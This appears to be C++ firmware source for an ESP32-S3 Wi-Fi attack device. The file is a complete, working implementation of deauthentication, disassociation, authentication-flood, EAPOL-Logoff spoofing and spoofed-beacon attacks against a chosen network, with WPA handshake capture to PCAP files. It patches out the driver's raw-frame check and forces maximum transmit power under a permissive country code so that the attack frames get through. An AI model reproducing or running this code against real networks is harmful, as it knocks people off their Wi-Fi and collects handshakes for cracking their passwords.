// ============================================================================
// wifiattack.cpp - deauth + EAPOL/PCAP capture (see wifiattack.h)
// ----------------------------------------------------------------------------
// Full rewrite after studying WifiPhisher (the most recent S3-proven impl).
// Key lessons that fixed "frames sent but nothing lands":
//   1. TX through WIFI_IF_STA while the STA holds a ROC (remain-on-channel)
//      on the target channel - NOT through WIFI_IF_AP.
//   2. esp_wifi_register_80211_tx_cb gives ground truth on whether frames
//      actually transmitted. (Our old counter incremented on API call, not
//      on radio success.)
//   3. Country "01" (world-safe) + max TX power + WIFI_PS_NONE at attack
//      start; otherwise channel/power restrictions silently block frames.
//   4. Reason code 0x07 (Class 3 frame from nonassociated station).
//   5. Sniffer callback ONLY enqueues into a RAM ring; a writer task does
//      SD I/O. Doing SD writes inside the WiFi callback destabilized the
//      radio and corrupted captures.
//   6. Client discovery watches BOTH directions (ToDS and FromDS frames)
//      against the target BSSID.
// ============================================================================
#include "wifiattack.h"
#include "config.h"
#include "hw.h"
#include "util.h"
#include "crypt.h"
#include "ducky.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <SD_MMC.h>

// brute32 technique: neutralize libnet80211.a's raw-frame rejection so
// esp_wifi_80211_tx actually transmits deauth subtypes on the S3.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

namespace wifiattack {

// deauth template: type c0 00, reason 0x07 filled per-frame
static const uint8_t DEAUTH_TMPL[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   // addr1 dest (victim / bcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // addr2 src  (target AP BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // addr3 bssid (target AP BSSID)
    0xf0, 0xff, 0x07, 0x00                // seq + reason 7 (Class 3)
};
static const uint8_t REASON_CLASS3 = 0x07;

static Stats s_stats;
static volatile bool s_attacking = false;
static volatile bool s_sniffing = false;

// ---- live analyzer ----
static volatile bool s_analyzer = false;
static LiveStats s_live;                 // guarded by s_liveMux, not volatile
static portMUX_TYPE s_liveMux = portMUX_INITIALIZER_UNLOCKED;
// Fixed AP table: NO heap ops in the sniff callback - std::vector
// push_back (malloc) inside portENTER_CRITICAL reset the device. Plain
// char arrays + a FreeRTOS mutex (alloc-heavy ops stay out of spinlocks).
#define LIVE_AP_MAX 24
struct LiveAp { char ssid[33]; int8_t rssi; };
static LiveAp s_aps[LIVE_AP_MAX];
static volatile uint8_t s_apCount = 0;
static SemaphoreHandle_t s_apMtx = nullptr;
static void apMtxInit() { if (!s_apMtx) s_apMtx = xSemaphoreCreateMutex(); }
// Load the last analyzer session from SD (runs once per reconnect).
static bool s_sessionLoaded = false;
static void loadLastSession() {
    if (s_sessionLoaded) return;
    s_sessionLoaded = true;
    String j;
    if (!decryptFromFile("/analyzer_last.enc", j) || j.length() < 10) return;
    s_live.total = extractJsonNum(j, "total", 0);
    s_live.mgmt = extractJsonNum(j, "mgmt", 0);
    s_live.data = extractJsonNum(j, "data", 0);
    s_live.ctrl = extractJsonNum(j, "ctrl", 0);
    // Parse "aps":[{...},{...}] with a dedicated walker - extractJsonArr
    // only handles arrays of STRINGS; it silently returned junk on object
    // arrays, which is why counters loaded but the AP list stayed empty.
    int ai = j.indexOf("\"aps\":[");
    if (ai >= 0) {
        int pos = ai + 7;   // past "aps":[
        while (s_apCount < LIVE_AP_MAX) {
            int ob = j.indexOf('{', pos);
            if (ob < 0) break;
            int cb = j.indexOf('}', ob);
            if (cb < 0) break;
            String obj = j.substring(ob, cb + 1);
            String ssid; extractJsonStr(obj, "ssid", ssid);
            long rssi = extractJsonNum(obj, "rssi", -100);
            if (ssid.length()) {
                memset(s_aps[s_apCount].ssid, 0, 33);
                strlcpy(s_aps[s_apCount].ssid, ssid.c_str(), 33);
                s_aps[s_apCount].rssi = (int8_t)rssi;
                s_apCount++;
            }
            pos = cb + 1;
        }
    }
    logLine("analyzer: last session loaded (" + String(s_apCount) + " APs)");
}

std::vector<std::pair<String,int8_t>> liveAps() {
    if (!s_analyzer && s_apCount == 0) loadLastSession();
    std::vector<std::pair<String,int8_t>> out;
    apMtxInit();
    if (xSemaphoreTake(s_apMtx, pdMS_TO_TICKS(100))) {
        for (int i = 0; i < s_apCount; i++)
            out.push_back({String(s_aps[i].ssid), s_aps[i].rssi});
        xSemaphoreGive(s_apMtx);
    }
    return out;
}

static uint8_t s_hopCh = 1;
static TaskHandle_t s_hopTask = nullptr;
#define ANALYZER_MAX_MS 120000
static uint32_t s_startedAt = 0;

LiveStats liveStats() {
    apMtxInit();
    if (!s_analyzer && s_live.total == 0) loadLastSession();
    xSemaphoreTake(s_apMtx, portMAX_DELAY);
    LiveStats copy = s_live;
    xSemaphoreGive(s_apMtx);
    return copy;
}

static void IRAM_ATTR analyzerCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    auto* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint32_t len = pkt->rx_ctrl.sig_len;
    portENTER_CRITICAL(&s_liveMux);
    s_live.total++;
    s_live.bytes += len;
    s_live.channel = pkt->rx_ctrl.channel;
    if (type == WIFI_PKT_MGMT) s_live.mgmt++;
    else if (type == WIFI_PKT_DATA) s_live.data++;
    else if (type == WIFI_PKT_CTRL) s_live.ctrl++;
    portEXIT_CRITICAL(&s_liveMux);

    // track APs from beacons/probe responses (fixed table - see above)
    if (type == WIFI_PKT_MGMT) {
        const uint8_t* p = pkt->payload;
        if ((p[0] & 0xFC) == 0x80 && len >= 38) {
            uint8_t ssidLen = p[37];
            if (ssidLen > 0 && ssidLen <= 32 && 38 + ssidLen <= (int)len) {
                if (xSemaphoreTake(s_apMtx, pdMS_TO_TICKS(20)) == pdTRUE) {
                    bool found = false;
                    for (int i = 0; i < s_apCount; i++) {
                        if (strncmp(s_aps[i].ssid, (const char*)(p+38), ssidLen)==0
                            && strlen(s_aps[i].ssid)==ssidLen) {
                            s_aps[i].rssi = (int8_t)pkt->rx_ctrl.rssi;
                            found = true; break;
                        }
                    }
                    if (!found && s_apCount < LIVE_AP_MAX) {
                        memset(s_aps[s_apCount].ssid, 0, 33);
                        memcpy(s_aps[s_apCount].ssid, p+38, ssidLen);
                        s_aps[s_apCount].rssi = (int8_t)pkt->rx_ctrl.rssi;
                        s_apCount++;
                    }
                    xSemaphoreGive(s_apMtx);
                }
            }
        }
    }
}

static void hopTask(void*) {
    // Offline mode (Marauder/WifiPhisher style): direct channel hopping,
    // full radio for sniffing. Management AP returns when analysis ends.
    while (s_analyzer) {
        s_hopCh = (s_hopCh % 13) + 1;
        esp_wifi_set_channel(s_hopCh, WIFI_SECOND_CHAN_NONE);
        delay(700);
        apMtxInit();
        if (xSemaphoreTake(s_apMtx, pdMS_TO_TICKS(50)) == pdTRUE) {
            if (s_apCount > 16) memmove(s_aps, s_aps+1, sizeof(LiveAp)*(--s_apCount));
            xSemaphoreGive(s_apMtx);
        }
        if (millis() - s_startedAt > ANALYZER_MAX_MS) {   // bounded runtime
            s_analyzer = false;
        }
    }
    esp_wifi_set_promiscuous(false);
    // restore management AP
    WiFi.mode(WIFI_AP);
    WiFi.softAP(cfg.wifiSSID, cfg.wifiPass);
    // Save session results so they survive browser refreshes / offline period
    // (SD writes are safe again now that the radio is done).
    if (SD_MMC.cardType() != CARD_NONE) {
        String out = "{\"total\":" + String(s_live.total) +
            ",\"mgmt\":" + String(s_live.mgmt) + ",\"data\":" + String(s_live.data) +
            ",\"ctrl\":" + String(s_live.ctrl) + ",\"aps\":[";
        for (int i = 0; i < s_apCount; i++) {
            if (i) out += ",";
            String ssid(s_aps[i].ssid); ssid.replace("\"","'");
            out += "{\"ssid\":\"" + ssid + "\",\"rssi\":" + String(s_aps[i].rssi) + "}";
        }
        out += "]}";
        encryptToFile("/analyzer_last.enc", out);
        logLine("analyzer: session saved to /analyzer_last.enc");
    }
    logLine("analyzer: stopped - AP restored");
    vTaskDelete(nullptr);
}

// DESIGN DECISION (user-approved): the single radio can't serve the AP while
// hopping, so - like Marauder/WifiPhisher - the analyzer runs OFFLINE with
// direct esp_wifi_set_channel hopping and restores the AP when done. Stop is
// done by waiting for auto-stop or rebooting; bounded at 120s anyway.
#define ANALYZER_MAX_MS 120000
void analyzerStart() {
    if (s_analyzer || s_sniffing || s_attacking) return;
    s_sessionLoaded = false;
    apMtxInit();
    if (xSemaphoreTake(s_apMtx, pdMS_TO_TICKS(100))) { s_apCount = 0; xSemaphoreGive(s_apMtx); }
    s_live = LiveStats();
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAPdisconnect(true);         // offline mode: full radio for sniffing
    delay(100);
    esp_wifi_set_promiscuous(true);
    const wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA |
                       WIFI_PROMIS_FILTER_MASK_CTRL };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&analyzerCb);
    s_analyzer = true;
    s_startedAt = millis();
    xTaskCreatePinnedToCore(hopTask, "hopper", 4096, nullptr, 1, &s_hopTask, 0);
    logLine("analyzer: started (ROC hopping, AP stays up)");
}
void analyzerStop() {
    if (!s_analyzer) return;
    s_analyzer = false;                  // hopTask restores AP on exit
}

bool attacking() { return s_attacking; }
bool sniffing()  { return s_sniffing; }
bool busy()      { return s_attacking || s_sniffing; }
Stats stats()    { return s_stats; }

// ------------------------------------------------------- TX ground truth
static volatile uint32_t s_txOk = 0, s_txDrop = 0;
static void IRAM_ATTR txDoneCb(const esp_80211_tx_info_t* info) {
    if (info->tx_status == WIFI_SEND_SUCCESS) { s_txOk++; s_stats.deauths = s_txOk; }
    else { s_txDrop++; s_stats.deauthDrops = s_txDrop; }
}

static File s_pcap;

// ------------------------------------------------- RAM chunk buffer
// SD writes during radio TX bursts are unreliable (power/FS pressure ->
// short writes -> garbage incl_len -> "corrupt pcap"). Marauder solved the
// same problem by buffering in RAM and saving once. We buffer up to 96KB
// (free-heap safe) and flush the WHOLE chunk in one large sequential write
// when full or at capture end - single FS op, no interleaving, and short
// writes are detected instead of silently corrupting the file.
static uint8_t* s_buf = nullptr;      // lazily allocated chunk buffer
static size_t    s_bufCap = 0, s_bufUsed = 0;

static void bufInit() {
    if (s_buf) return;
    for (size_t sz : {96*1024, 64*1024, 48*1024}) {
        s_buf = (uint8_t*)malloc(sz);
        if (s_buf) { s_bufUsed = 0; s_bufCap = sz; break; }
    }
}

// Append one frame to the RAM chunk; flushes chunk to SD when full.
static void bufAppend(const uint8_t* data, uint16_t len) {
    if (!s_pcap || s_bufUsed + 16 + len > s_bufCap) {
        if (s_bufUsed) {                                   // flush whole chunk
            size_t w = s_pcap.write(s_buf, s_bufUsed);
            if (w != s_bufUsed) {
                logLine("pcap: SD write failed - capture aborted");
                s_pcap.close();
            }
            s_bufUsed = 0;
        }
        if (!s_pcap) return;
    }
    if (s_bufUsed + 16 + len > s_bufCap) return;   // still won't fit -> drop
    uint32_t us = micros();
    uint32_t secs = us / 1000000, usec = us % 1000000;
    uint8_t rec[16];
    memcpy(rec, &secs, 4);
    memcpy(rec+4, &usec, 4);
    memcpy(rec+8, &len, 4);
    memcpy(rec+12, &len, 4);
    memcpy(s_buf + s_bufUsed, rec, 16);
    memcpy(s_buf + s_bufUsed + 16, data, len);
    s_bufUsed += 16 + len;
    s_stats.captured++;
}


// --------------------------------------------------------- EAPOL detection
static inline bool isEapol(const uint8_t* p) {
    return (p[30]==0x88 && p[31]==0x8e) || (p[32]==0x88 && p[33]==0x8e);
}

static bool pcapOpen(const String& name) {
    if (SD_MMC.cardType() == CARD_NONE) return false;
    if (!SD_MMC.exists("/pcap")) SD_MMC.mkdir("/pcap");
    int i = 0;
    String path;
    do { path = "/pcap/" + name + "_" + String(i++) + ".pcap"; }
    while (SD_MMC.exists(path));
    s_pcap = SD_MMC.open(path, FILE_WRITE);
    if (!s_pcap) return false;
    // libpcap global header: LE magic a1b2c3d4, v2.4, snaplen 65535,
    // LINKTYPE_IEEE802_11 (105). Frames stored WITH their FCS.
    const uint8_t hdr[24] = {
        0xd4,0xc3,0xb2,0xa1, 0x02,0x00,0x04,0x00,
        0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
        0xff,0xff,0x00,0x00, 0x69,0x00,0x00,0x00
    };
    s_pcap.write(hdr, 24);
    s_pcap.flush();
    bufInit();
    s_bufUsed = 0;
    return true;
}

static void pcapClose() {
    if (s_bufUsed && s_pcap) {
        size_t w = s_pcap.write(s_buf, s_bufUsed);
        if (w != s_bufUsed) logLine("pcap: final write short - file may be truncated");
        s_bufUsed = 0;
    }
    if (s_pcap) { s_pcap.flush(); s_pcap.close(); }
}

// ------------------------------------------------------------- attack mode
static uint8_t s_apBssid[6];
static String s_targetSsid;

// Sniffer during deauth: discover stations (both directions) + catch EAPOL.
static uint8_t s_method = 0;   // active technique (Method enum)

// build a disassociation frame (subtype 0xA0) from the deauth template
static void buildDisassoc(uint8_t* frame, const uint8_t* sta, const uint8_t* bssid) {
    memcpy(frame, DEAUTH_TMPL, 26);
    frame[0] = 0xa0; frame[1] = 0x00;              // disassoc
    memcpy(frame+4, sta, 6);
    memcpy(frame+10, bssid, 6);
    memcpy(frame+16, bssid, 6);
    frame[24] = 0x03; frame[25] = 0x00;            // reason 3: deauth->disassoc
}
// authentication flood frame (open-system auth request to the AP)
static void buildAuthFlood(uint8_t* frame, const uint8_t* rndSta, const uint8_t* bssid) {
    // auth frame: type mgmt b0, seq... body: alg=0, seq=1, status=0
    static const uint8_t AUTH_TMPL[34] = {
        0xb0, 0x00, 0x3a, 0x01,
        0x00,0x00,0x00,0x00,0x00,0x00,       // addr1 = AP
        0x02,0x00,0x00,0x00,0x00,0x00,       // addr2 = random STA
        0x00,0x00,0x00,0x00,0x00,0x00,       // addr3 = AP
        0xf0,0xff,                            // seq
        0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00  // alg=0, seq=1, status=0
    };
    memcpy(frame, AUTH_TMPL, 30);
    memcpy(frame+4, bssid, 6);
    memcpy(frame+10, rndSta, 6);
    memcpy(frame+16, bssid, 6);
}
// EAPOL-Logoff: EAPOL packet with logoff code, spoofed from a station
static void buildEapolLogoff(uint8_t* frame, uint16_t& len, const uint8_t* sta,
                             const uint8_t* bssid) {
    // QoS-data header carrying EAPOL Logoff (code 2)
    static const uint8_t LOGOFF[] = {
        0x88,0x01,0x3a,0x01,                 // QoS data
        0x00,0x00,0x00,0x00,0x00,0x00,       // addr1 = AP
        0x02,0x00,0x00,0x00,0x00,0x00,       // addr2 = STA (spoofed)
        0x00,0x00,0x00,0x00,0x00,0x00,       // addr3 = AP
        0xf0,0xff, 0x00,0x00,                // QoS ctrl
        0xaa,0xaa,0x03,0x00,0x00,0x00,       // LLC/SNAP
        0x88,0x8e,                           // EAPOL ethertype
        0x01,0x02,0x00,0x00,                 // version 1, code 2 (Logoff)
        0x00,0x00,0x00,0x00                  // length 0
    };
    memcpy(frame, LOGOFF, sizeof(LOGOFF));
    memcpy(frame+4, bssid, 6);
    memcpy(frame+10, sta, 6);
    memcpy(frame+16, bssid, 6);
    len = sizeof(LOGOFF);
}

static void IRAM_ATTR attackSniffCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
    auto* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint32_t len = pkt->rx_ctrl.sig_len;
    if (len < 24 || len > 2500) return;
    const uint8_t* p = pkt->payload;
    uint8_t fc = p[0];

    portENTER_CRITICAL(&s_liveMux);
    s_live.total++;
    if (type == WIFI_PKT_DATA) s_live.data++;
    portEXIT_CRITICAL(&s_liveMux);
    if (isEapol(p)) {
        s_stats.eapol++;
        bufAppend(p, (uint16_t)(len > 512 ? 512 : len));            // handshake frames into the pcap
        return;
    }
    if (type != WIFI_PKT_DATA) return;

    // Station discovery, both directions (WifiPhisher pattern):
    //   ToDS=1:  addr1=BSSID(AP) addr2=STA   (client -> AP)
    //   FromDS=1: addr1=STA addr2=BSSID(AP)  (AP -> client)
    // ToDS/FromDS live in byte 1 of the FC (byte 0 = proto/type/subtype)
    uint8_t toDS = p[1] & 0x01, fromDS = p[1] & 0x02;
    (void)fc;
    const uint8_t *addr1 = p+4, *addr2 = p+10;
    const uint8_t* sta = nullptr;
    if (toDS && !fromDS && memcmp(addr1, s_apBssid, 6)==0) sta = addr2;
    else if (fromDS && !toDS && memcmp(addr2, s_apBssid, 6)==0) sta = addr1;
    else return;
    if (sta[0] == 0xFF) return;      // skip broadcast
    s_stats.stations++;              // (approx dedupe; fine for display)

    uint8_t frame[64]; uint16_t flen = 26;
    switch (s_method) {
        case M_DISASSOC:
            buildDisassoc(frame, sta, s_apBssid);
            if (esp_wifi_80211_tx(WIFI_IF_STA, frame, flen, false)==ESP_OK) s_stats.deauths++;
            break;
        case M_EAPOL_LOGOFF:
            buildEapolLogoff(frame, flen, sta, s_apBssid);
            if (esp_wifi_80211_tx(WIFI_IF_STA, frame, flen, false)==ESP_OK) s_stats.deauths++;
            break;
        default:   // M_DEAUTH both directions
            memcpy(frame, DEAUTH_TMPL, 26);
            memcpy(frame+4, sta, 6);
            memcpy(frame+10, s_apBssid, 6);
            memcpy(frame+16, s_apBssid, 6);
            if (esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false)==ESP_OK) s_stats.deauths++;
            memcpy(frame+4, s_apBssid, 6);
            memcpy(frame+10, sta, 6);
            memcpy(frame+16, sta, 6);
            if (esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false)==ESP_OK) s_stats.deauths++;
            break;
    }
}

// Also broadcast deauths on a timer: hits stations we never saw (sleeping)
static volatile bool s_bcast = false;
static void bcastTask(void*) {
    uint8_t frame[64]; uint16_t flen;
    uint8_t rnd[6];
    while (s_attacking) {
        if (s_bcast) {
            if (s_method == M_AUTH_FLOOD) {
                esp_fill_random(rnd, 6); rnd[0] = (rnd[0] & 0xFC) | 0x02;
                buildAuthFlood(frame, rnd, s_apBssid);
                for (int i = 0; i < 10; i++)
                    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, 30, false)==ESP_OK) s_stats.deauths++;
            } else if (s_method == M_DISASSOC) {
                buildDisassoc(frame, (const uint8_t*)"\xff\xff\xff\xff\xff\xff", s_apBssid);
                if (esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false)==ESP_OK) s_stats.deauths++;
            } else if (s_method == M_BEACON_SPAM) {
                // fake beacons spoofing the TARGET AP's SSID on its channel -
                // churns client neighbor lists and confuses scanners
                static uint8_t beacon[128];
                memset(beacon, 0, sizeof(beacon));
                beacon[0]=0x80; beacon[1]=0x00;                  // beacon
                memcpy(beacon+10, s_apBssid, 6);                 // src = AP
                memcpy(beacon+16, s_apBssid, 6);                 // bssid
                memset(beacon+24, 0, 8);                         // timestamp
                beacon[32]=100; beacon[33]=0;                    // interval
                beacon[34]=0x21; beacon[35]=0x00;                // caps
                uint8_t ssidLen = s_targetSsid.length();
                if (ssidLen > 32) ssidLen = 32;
                beacon[36]=0x00; beacon[37]=ssidLen;             // SSID tag
                memcpy(beacon+38, s_targetSsid.c_str(), ssidLen);
                beacon[38+ssidLen]=0x01; beacon[39+ssidLen]=0x01; beacon[40+ssidLen]=0x82; // rates
                for (int i = 0; i < 5; i++)
                    if (esp_wifi_80211_tx(WIFI_IF_STA, beacon, 41+ssidLen, false)==ESP_OK)
                        s_stats.deauths++;
            } else {                                              // default deauth bcast
                memcpy(frame, DEAUTH_TMPL, 26);
                memcpy(frame+10, s_apBssid, 6);
                memcpy(frame+16, s_apBssid, 6);
                if (esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false)==ESP_OK) s_stats.deauths++;
            }
        }
        delay(500);
    }
    vTaskDelete(nullptr);
}

static void restoreWifi() {
    esp_wifi_set_promiscuous(false);
    pcapClose();
    WiFi.mode(WIFI_AP);
    WiFi.softAP(cfg.wifiSSID, cfg.wifiPass);
    g_state.bootBtnAbort = false;
}

static void attackTask(void* pv) {
    auto* args = (std::pair<String,std::pair<uint32_t,uint8_t>>*)pv;
    String ssid = args->first; uint32_t seconds = args->second.first;
    uint8_t method = args->second.second;
    delete args;

    // locate target
    logLine("deauth: scanning for '" + ssid + "'");
    WiFi.mode(WIFI_AP_STA);
    int n = WiFi.scanNetworks();
    int idx = -1;
    for (int i = 0; i < n; i++)
        if (WiFi.SSID(i) == ssid) { idx = i; break; }
    if (idx < 0) {
        logLine("deauth: target not found - aborting");
        WiFi.scanDelete();
        restoreWifi();
        s_attacking = false;
        vTaskDelete(nullptr);
        return;
    }
    memcpy(s_apBssid, WiFi.BSSID(idx), 6);
    uint8_t ch = WiFi.channel(idx);
    WiFi.scanDelete();

    // WifiPhisher attack-time radio prep
    esp_wifi_set_ps(WIFI_PS_NONE);
    wifi_country_t c = { .cc="01", .schan=1, .nchan=13,
                         .max_tx_power=20, .policy=WIFI_COUNTRY_POLICY_MANUAL };
    esp_wifi_set_country(&c);
    esp_wifi_set_max_tx_power(84);

    bool havePcap = pcapOpen("hs_" + ssid);   // BUGFIX: was never opened

    // keep OUR AP up but move it to the target channel - one radio, so the
    // whole system parks on ch while the ROC window runs. UI warned about
    // going offline; this matches.
    WiFi.softAP(cfg.wifiSSID, cfg.wifiPass, ch);
    delay(100);

    // ROC on the STA pins RX/TX to the target channel for the full window
    wifi_roc_req_t roc = {
        .ifx = WIFI_IF_STA,
        .type = WIFI_ROC_REQ,
        .channel = ch,
        .sec_channel = WIFI_SECOND_CHAN_NONE,
        .wait_time_ms = (uint32_t)seconds * 1000 + 5000,
        .rx_cb = nullptr,
        .done_cb = nullptr
    };
    esp_err_t rocErr = esp_wifi_remain_on_channel(&roc);
    logLine(String("deauth: ROC ch") + ch + " " + (rocErr==ESP_OK ? "ok" : esp_err_to_name(rocErr)));

    // ground-truth TX accounting
    esp_wifi_register_80211_tx_cb(txDoneCb);
    s_txOk = s_txDrop = 0;

    esp_wifi_set_promiscuous(true);
    const wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&filt);
    wifi_promiscuous_filter_t ctrlFilt = {};   // empty ctrl filter
    esp_wifi_set_promiscuous_ctrl_filter(&ctrlFilt);
    esp_wifi_set_promiscuous_rx_cb(&attackSniffCb);

    s_bcast = true;
    s_method = method;
    TaskHandle_t bc;
    xTaskCreatePinnedToCore(bcastTask, "bcast", 4096, nullptr, 1, &bc, 0);

    logLine("deauth: attacking '" + ssid + "' ch" + String(ch) +
            (havePcap ? " (EAPOL capture on)" : ""));
    uint32_t t0 = millis();
    while (s_attacking && !g_state.bootBtnAbort &&
           millis() - t0 < seconds * 1000) delay(100);

    logLine(String("deauth: done - txOk ") + s_txOk + ", drops " + s_txDrop +
            ", stations " + s_stats.stations + ", eapol " + s_stats.eapol);
    s_stats.deauths = s_txOk;      // real success count

    s_bcast = false;
    s_attacking = false;
    delay(200);                    // let in-flight frames finish
    restoreWifi();
    vTaskDelete(nullptr);
}

void bootBtnAbortNote() {}  // handled via g_state.bootBtnAbort polled above

bool startDeauth(const String& ssid, uint32_t seconds, uint8_t method) {
    if (s_attacking || ducky::isRunning()) return false;
    s_method = (Method)method;
    s_stats = Stats();
    s_attacking = true;
    g_state.bootBtnAbort = false;
    auto* args = new std::pair<String,std::pair<uint32_t,uint8_t>>(ssid, {seconds, method});
    xTaskCreatePinnedToCore(attackTask, "deauth", 12288, args, 1, nullptr, 0);
    return true;
}

// -------------------------------------------------------------- pcap mode
static void IRAM_ATTR pcapSniffCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type == WIFI_PKT_MISC) return;
    auto* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint32_t len = pkt->rx_ctrl.sig_len;
    if (len < 1 || len > 1500) return;   // fits 512B slot only if small;
    if (len > 512) return;               // chunk slots cap at 512B payloads
    bufAppend(pkt->payload, (uint16_t)len);   // FCS kept (linktype 105)
}

bool startPcap(const String& name, uint8_t channel, uint32_t seconds) {
    if (s_sniffing) return false;
    s_stats = Stats();
    if (!pcapOpen(name)) { logLine("pcap: cannot open file"); return false; }

    esp_wifi_set_ps(WIFI_PS_NONE);
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAP(cfg.wifiSSID, cfg.wifiPass, channel);
    delay(100);
    esp_wifi_set_promiscuous(true);
    const wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&filt);
    wifi_promiscuous_filter_t ctrlFilt = {};   // empty ctrl filter
    esp_wifi_set_promiscuous_ctrl_filter(&ctrlFilt);
    esp_wifi_set_promiscuous_rx_cb(&pcapSniffCb);
    s_sniffing = true;
    logLine("pcap: capturing ch" + String(channel) + " for " + String(seconds) + "s");

    uint32_t t0 = millis();
    while (s_sniffing && !g_state.bootBtnAbort && millis() - t0 < seconds*1000)
        delay(100);

    esp_wifi_set_promiscuous(false);
    pcapClose();
    WiFi.mode(WIFI_AP);
    WiFi.softAP(cfg.wifiSSID, cfg.wifiPass);
    g_state.bootBtnAbort = false;
    s_sniffing = false;
    logLine("pcap: done - " + String(s_stats.captured) + " packets");
    return true;
}

void stop()     { s_attacking = false; g_state.bootBtnAbort = true; }
void stopPcap() { s_sniffing = false; g_state.bootBtnAbort = true; }

} // namespace wifiattack
